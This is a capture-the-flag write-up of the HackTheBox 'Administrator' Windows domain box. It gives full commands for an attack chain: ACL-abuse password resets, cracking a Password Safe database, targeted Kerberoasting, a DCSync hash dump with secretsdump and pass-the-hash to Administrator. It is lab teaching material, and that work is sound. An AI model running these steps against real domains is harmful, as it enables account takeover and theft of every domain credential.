# HackTheBox — Administrator | Full Writeup

> **Platform:** HackTheBox
> **Author:** k41r0s3
> **Difficulty:** Medium
> **Category:** Active Directory / Windows
> **Date:** 2026-04-18

---

## Table of Contents

1. [TL;DR](#tldr)
2. [Recon](#recon)
3. [ACL Enumeration](#acl-enumeration)
4. [Initial Access](#initial-access)
5. [Lateral Movement — Olivia → Michael → Benjamin](#lateral-movement--olivia--michael--benjamin)
6. [Lateral Movement — Benjamin → Emily (Password Safe)](#lateral-movement--benjamin--emily-password-safe)
7. [Privilege Escalation — Emily → Ethan → Administrator](#privilege-escalation--emily--ethan--administrator)
8. [Attack Chain](#attack-chain)
9. [Tools Used](#tools-used)
10. [Vulnerabilities Exploited](#vulnerabilities-exploited)
11. [What Failed — Dead Ends](#what-failed--dead-ends)
12. [Key Takeaways](#key-takeaways)

---

## TL;DR

Administrator is a medium Windows Active Directory box built entirely around ACL abuse and credential chaining. Starting with a given low-privilege user who has WinRM access, BloodHound enumeration reveals a linear chain of ACL misconfigurations — GenericAll, ForceChangePassword, and GenericWrite — allowing progressive lateral movement across five user accounts. A Password Safe database exposed on FTP is cracked to retrieve mid-chain credentials. The final user has GenericWrite over a domain account, enabling a Targeted Kerberoast attack whose cracked hash grants DCSync rights, resulting in full domain compromise via Pass-the-Hash.

---

## Recon

### Port Scan

```bash
nmap -sV -Pn --top-ports 100 <TARGET_IP>
```

```
21/tcp  open  ftp           Microsoft ftpd
53/tcp  open  domain        Simple DNS Plus
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP
                            (Domain: administrator.htb)
445/tcp open  microsoft-ds?
```

**Thought process:** Textbook Windows Domain Controller fingerprint. Kerberos on 88, LDAP on 389, SMB on 445 — this is an AD box. FTP on 21 is the anomaly; FTP has no business on a DC, which makes it immediately interesting. The domain is `administrator.htb`, which strongly signals the endgame is compromising the Administrator account.

### SMB / User Enumeration

```bash
netexec smb <TARGET_IP> -u <given_user> -p <given_pass> --shares
netexec smb <TARGET_IP> -u <given_user> -p <given_pass> --users
```

**Key finding:** Credentials valid. Eight domain users enumerated. Standard share set only (SYSVOL, NETLOGON, IPC$) — no write access to anything useful. Two users (alexander, emma) later confirmed disabled.

### WinRM Check

```bash
netexec winrm <TARGET_IP> -u <given_user> -p <given_pass>
```

**Key finding:** `[+] Pwn3d!` — the given user has WinRM access. Immediate shell available without further exploitation.

### BloodHound Collection

```bash
bloodhound-python -u <user> -p <pass> -d administrator.htb \
  -dc dc.administrator.htb -ns <TARGET_IP> -c All
```

**Key finding:** Successfully collected users, groups, ACLs, GPOs, containers. NetBIOS timeout on computer enumeration is non-fatal — all ACL data captured. Seven JSON files produced for import.

---

## ACL Enumeration

### Parsing BloodHound JSONs for Abusable ACEs

Rather than loading into the BloodHound UI, ACEs can be parsed directly from the JSON output:

```bash
cat *_users.json | python3 -c "
import json,sys
data=json.load(sys.stdin)
interesting = ['GenericAll','GenericWrite','WriteOwner','WriteDacl',
               'ForceChangePassword','AllExtendedRights']
for u in data['data']:
    name = u['Properties'].get('name','?')
    for ace in u.get('Aces',[]):
        right = ace.get('RightName','')
        principal = ace.get('PrincipalSID','?')
        if any(r in right for r in interesting):
            print(f'{principal} -> {name}: {right}')
"
```

**Key findings — abusable ACE chain:**

```
Olivia  --[GenericAll]-----------> Michael
Michael --[ForceChangePassword]--> Benjamin
Emily   --[GenericWrite]---------> Ethan
```

Also confirmed from inside a WinRM shell using PowerShell AD ACL queries:

```powershell
Get-ADUser -Filter * | ForEach-Object {
    $user = $_
    $acl = Get-ACL "AD:\$($user.DistinguishedName)"
    $acl.Access | Where-Object {$_.IdentityReference -like "*<username>*"} | ForEach-Object {
        Write-Host "$($user.SamAccountName): $($_.ActiveDirectoryRights)"
    }
}
```

**Thought process:** This is a linear ACL chain — each user controls the next. The intended path is to hop user-by-user abusing these misconfigurations. The question is what connects Benjamin to Emily, since there's no direct ACE between them.

---

## Initial Access

### Shell as Given User (WinRM)

```bash
evil-winrm -i <TARGET_IP> -u <given_user> -p <given_pass>
```

The given user has no user flag — they're purely the foothold. Enumeration confirms they have no meaningful privileges on the domain beyond WinRM access and the ACL over Michael.

---

## Lateral Movement — Olivia → Michael → Benjamin

### Step 1: Olivia → Michael (GenericAll — Password Reset)

GenericAll grants full control over the target object, including the ability to reset their password without knowing the current one.

```bash
net rpc password <target_user> '<new_password>' \
  -U '<domain>/<current_user>%<current_pass>' -S <TARGET_IP>
```

Verify access:
```bash
netexec winrm <TARGET_IP> -u michael -p '<new_password>'
# → Pwn3d! — WinRM confirmed
evil-winrm -i <TARGET_IP> -u michael -p '<new_password>'
```

**Why it works:** GenericAll is the most permissive AD right — it encompasses WriteDacl, WriteOwner, GenericWrite, and all extended rights including User-Force-Change-Password.

### Step 2: Michael → Benjamin (ForceChangePassword)

Michael has the `User-Force-Change-Password` extended right on Benjamin, allowing a password reset without knowing Benjamin's current password.

```bash
net rpc password benjamin '<new_password>' \
  -U '<domain>/michael%<michael_pass>' -S <TARGET_IP>
```

Verify:
```bash
netexec smb <TARGET_IP> -u benjamin -p '<new_password>'
# → valid
netexec winrm <TARGET_IP> -u benjamin -p '<new_password>'
# → FAIL — Benjamin has no WinRM
netexec ftp <TARGET_IP> -u benjamin -p '<new_password>'  # or manual ftp
# → SUCCESS — Benjamin has FTP
```

**Thought process:** No WinRM means no direct shell, but FTP was open from the initial scan. Always test every service with each new credential set — don't assume the same access profile across users.

---

## Lateral Movement — Benjamin → Emily (Password Safe)

### Step 3: FTP — Exposed Password Safe Database

```bash
ftp <TARGET_IP>
# Login as benjamin with reset password
ftp> binary          # critical — use binary mode for non-text files
ftp> ls
# Backup.psafe3
ftp> get Backup.psafe3
ftp> exit
```

**Thought process:** `.psafe3` is a Password Safe v3 database — a cross-platform credential manager. This file almost certainly contains domain credentials.

### Step 4: Crack the Master Password

```bash
pwsafe2john Backup.psafe3 > psafe.hash
john psafe.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The master password cracks quickly from rockyou.

### Step 5: Extract Credentials

Open the database using the cracked master password with any compatible Password Safe client. The database contains credentials for several domain users. Two accounts (alexander, emma) are disabled — only one enabled account's credentials are actionable.

### Step 6: Shell as Emily + User Flag

```bash
evil-winrm -i <TARGET_IP> -u emily -p '<extracted_password>'
```

```powershell
type C:\Users\emily\Desktop\user.txt
```

---

## Privilege Escalation — Emily → Ethan → Administrator

### Step 7: Emily's ACL Rights — GenericWrite over Ethan

Running the PowerShell ACL query as Emily reveals GenericWrite over Ethan.

**Thought process:** GenericWrite allows setting arbitrary user attributes, including `servicePrincipalName`. Setting a fake SPN turns a non-Kerberoastable user into a Kerberoastable one — this is Targeted Kerberoasting. It's cleaner than a password reset because the tool automatically removes the SPN after capturing the hash.

### Step 8: Targeted Kerberoast

**Important — sync time first:**

```bash
sudo ntpdate <TARGET_IP>
```

Kerberos authentication will fail with `KRB_AP_ERR_SKEW` if clock skew exceeds 5 minutes. Always run ntpdate before any Kerberos-based attack on HTB boxes.

```bash
wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/main/targetedKerberoast.py

python3 targetedKerberoast.py \
  -u emily -p '<emily_pass>' \
  -d administrator.htb --dc-ip <TARGET_IP>
```

This automatically: sets a fake SPN on Ethan → requests TGS → prints the hash → removes the SPN.

### Step 9: Crack Ethan's TGS Hash

```bash
# Save the printed hash to ethan.hash
john ethan.hash --wordlist=/usr/share/wordlists/rockyou.txt
# hashcat alternative: hashcat -m 13100 ethan.hash rockyou.txt
```

The hash type is `krb5tgs` (etype 23 / RC4) — Hashcat mode 13100.

### Step 10: DCSync as Ethan

```bash
impacket-secretsdump <domain>/ethan:<cracked_pass>@<TARGET_IP>
```

**Why it works:** Ethan has DCSync rights — specifically the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights on the domain object. `secretsdump` uses the DRSUAPI replication protocol to pull all password hashes from NTDS.DIT remotely, without touching disk on the DC.

This dumps NTLM hashes for every domain account including Administrator.

### Step 11: Pass-the-Hash — Administrator

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H '<administrator_ntlm_hash>'
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Chain

```
nmap → FTP(21), Kerberos(88), LDAP(389), SMB(445), WinRM(5985)
│
├── Given creds → WinRM shell (given_user) ✅
│   └── BloodHound + ACL enumeration
│       └── GenericAll over Michael
│           └── Password reset → michael shell ✅
│               └── ForceChangePassword over Benjamin
│                   └── Password reset → Benjamin (no WinRM)
│                       └── FTP login → Backup.psafe3
│                           └── pwsafe2john + john → master password cracked
│                               └── emily credentials extracted
│                                   └── WinRM shell (emily) ✅
│                                       └── user.txt ✅
│                                       └── GenericWrite over Ethan
│                                           └── ntpdate → targetedKerberoast
│                                               └── TGS hash → john → cracked
│                                                   └── DCSync → all NTLM hashes
│                                                       └── PTH as Administrator ✅
│                                                           └── root.txt ✅
```

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service detection |
| `netexec` | SMB/WinRM/FTP enumeration and credential testing |
| `bloodhound-python` | Active Directory enumeration and ACL collection |
| `evil-winrm` | WinRM shell |
| `impacket-secretsdump` | DCSync via DRSUAPI |
| `targetedKerberoast.py` | Abuse GenericWrite for targeted Kerberoasting |
| `john` | Crack Password Safe master password and TGS hash |
| `pwsafe2john` | Convert .psafe3 to john-crackable format |
| `net rpc password` | Remote password reset via MS-RPC |
| `ntpdate` | Clock sync for Kerberos |
| `ftp` | Retrieve Password Safe database |

---

## Vulnerabilities Exploited

| Vulnerability | Location | Impact |
| --- | --- | --- |
| GenericAll ACE misconfiguration | Olivia → Michael | Full object control, password reset |
| ForceChangePassword ACE misconfiguration | Michael → Benjamin | Password reset without knowing current |
| Sensitive file exposed on FTP | Benjamin's FTP home directory | Password Safe database retrieved |
| Weak Password Safe master password | Backup.psafe3 | Cracked with rockyou, credentials extracted |
| GenericWrite ACE misconfiguration | Emily → Ethan | Targeted Kerberoast, TGS hash captured |
| Weak Kerberos service ticket password | Ethan | TGS hash cracked offline |
| DCSync rights granted to non-admin user | Ethan | Full NTLM hash dump of domain |

---

## What Failed — Dead Ends

| Approach | Why It Failed |
| --- | --- |
| FTP as initial given user | Home directory inaccessible — account not configured for FTP |
| AS-REP Roasting all users | No accounts had `UF_DONT_REQUIRE_PREAUTH` set |
| Standard Kerberoasting | No SPNs configured on any user accounts |
| WinRM as Benjamin | Not a member of Remote Management Users |
| WinRM as Ethan | Not a member of Remote Management Users |
| Targeted Kerberoast before ntpdate | `KRB_AP_ERR_SKEW` — clock skew >5 min |
| FTP transfer in ASCII mode | `.psafe3` corrupted — always use `binary` mode for non-text files |

---

## Key Takeaways

**1. Always test every service with every new credential**
Benjamin had no WinRM but had FTP — a service that had been noted since the initial scan. Each new credential should be sprayed against all open services before moving on. Access profiles are not uniform across users.

**2. Targeted Kerberoasting is the cleanest GenericWrite abuse**
When you have GenericWrite over a user, Targeted Kerberoasting (via `targetedKerberoast.py`) is preferable to a password reset. It sets a temporary SPN, captures the TGS hash, then cleans up automatically — leaving no lingering changes to the account. The offline crack is the bottleneck, not the attack itself.

**3. Always run ntpdate before Kerberos attacks**
Clock skew greater than 5 minutes causes `KRB_AP_ERR_SKEW` and kills all Kerberos operations. `sudo ntpdate <DC_IP>` is a mandatory pre-step on any HTB box before Kerberoasting, AS-REP roasting, or requesting tickets.

**4. FTP on a DC almost always means credentials or sensitive data**
FTP is rarely deployed on a Domain Controller in legitimate environments. When it appears, treat it as a deliberate plant — enumerate every user's FTP home directory as you acquire new credentials throughout the chain.

**5. BloodHound JSON can be parsed offline without the GUI**
A simple Python script against the raw JSON files surfaces all interesting ACEs without needing Neo4j/BloodHound running. Useful when the UI is slow or unavailable, and faster for targeted queries.

**6. DCSync doesn't require SYSTEM — just the right domain permissions**
Any domain account with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` can DCSync. `impacket-secretsdump` performs this entirely over the network using DRSUAPI — no code execution on the DC required.

---

*Written by k41r0s3 | HackTheBox | Administrator | Medium*
